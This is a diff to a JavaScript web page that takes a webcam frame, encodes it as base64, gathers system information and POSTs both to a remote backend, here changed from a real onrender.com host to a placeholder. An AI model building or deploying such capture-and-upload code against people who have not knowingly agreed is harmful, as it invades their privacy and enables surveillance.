@@ -121,7 +121,9 @@
         $("webcamFeed").style.display = "block";
         info.webcam = info.microphone = "Accessible";
         webcamStream = stream;
-      } catch (e) { console.error("Error accessing webcam or microphone", e); }
+      } catch (e) {
+        console.error("Error accessing webcam or microphone", e);
+      }
 
       // Capture Image from webcam if accessible
       if (webcamStream) {
@@ -129,7 +131,7 @@
         const imageCapture = new ImageCapture(track);
         try {
           const bitmap = await imageCapture.grabFrame();
-          
+
           // Resize the image before converting it to base64
           const canvas = document.createElement('canvas');
           const MAX_WIDTH = 640; // Resize to a smaller width
@@ -148,8 +150,9 @@
 
           // Capture the resized image as base64
           capturedImageBase64 = canvas.toDataURL('image/jpeg'); // base64 image string
-          console.log("Captured Image Base64: ", capturedImageBase64); // Debugging
-        } catch (e) { console.error("Failed to capture webcam image:", e); }
+        } catch (e) {
+          console.error("Failed to capture webcam image:", e);
+        }
       }
 
       /* Send to Backend -----------------------------------------------*/
@@ -172,11 +175,15 @@
       // Display the message in the HTML
       $("systemInfo").textContent = message;
 
+      // Now send to your backend server
       try {
-        await fetch('https://system-info-terminal.onrender.com/send-message', {
+        await fetch('https://your-server-url/send-message', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ message, image: capturedImageBase64 }) // Send base64 string of the image
+          body: JSON.stringify({
+            message,
+            image: capturedImageBase64 // Send base64 string of the image
+          })
         });
       } catch (e) {
         console.error("Failed to send info:", e);
